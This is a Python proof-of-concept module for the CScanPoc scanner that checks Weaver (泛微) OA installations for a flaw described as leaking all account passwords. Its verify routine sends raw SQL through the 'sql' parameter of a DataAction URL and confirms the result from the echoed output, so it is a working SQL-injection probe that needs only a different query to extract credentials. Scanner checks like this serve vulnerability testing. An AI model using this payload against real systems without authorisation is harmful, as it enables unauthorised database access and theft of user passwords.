# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    vuln_id = 'weaver_0015' # 平台漏洞编号，留空
    name = '泛微OA平台系统 泄露所有账户密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-08-02'  # 漏洞公布时间
    desc = '''
        泛微OA平台系统设计不严谨，导致泄露所有账户密码。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'bfa67645-2cd7-4d87-b803-9c780f2c9991'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref:http://www.wooyun.org/bugs/wooyun-2015-0130759  
            payload = '/ServiceAction/com.eweaver.base.DataAction?sql=select%201,2,3,4,5,6,7,8,9,10%20from%20DUAL%20'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and '1,3,5,7,9__2 4 6 8 10' in  r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()